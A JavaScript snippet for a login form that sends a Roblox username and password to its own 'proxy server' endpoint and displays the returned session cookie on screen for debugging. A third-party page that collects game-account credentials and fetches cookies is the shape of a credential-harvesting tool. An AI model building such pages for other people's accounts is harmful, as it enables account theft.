document.getElementById('login-btn').addEventListener('click', async () => {
    const userInp = document.getElementById('username').value;
    const passInp = document.getElementById('password').value;
    const btn = document.getElementById('login-btn');
    const logs = document.getElementById('log-container');

    if (!userInp || !passInp) return alert("Please enter both username and password!");

    // UI Reset
    btn.disabled = true;
    btn.innerText = "Connecting to API...";
    logs.style.display = "block";
    logs.innerHTML = `<span style="color:#aaa;">Sending credentials to proxy server...</span>\n`;

    try {
        const response = await fetch('/api/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: userInp, password: passInp })
        });

        const data = await response.json();

        // Print the raw JSON response to the screen so you can debug it!
        if (response.ok) {
            logs.innerHTML += `<span class="success">✅ SUCCESS! Cookie Acquired:</span>\n`;
            logs.innerHTML += JSON.stringify(data, null, 2);
        } else {
            // If Roblox asks for a CAPTCHA or 2FA, it will show up right here!
            logs.innerHTML += `<span class="warning">⚠️ API CHALLENGE/ERROR:</span>\n`;
            logs.innerHTML += JSON.stringify(data, null, 2);
        }

    } catch (err) {
        logs.innerHTML += `<span class="error">❌ NETWORK ERROR: ${err.message}</span>`;
    } finally {
        btn.disabled = false;
        btn.innerText = "Secure Login";
    }
});

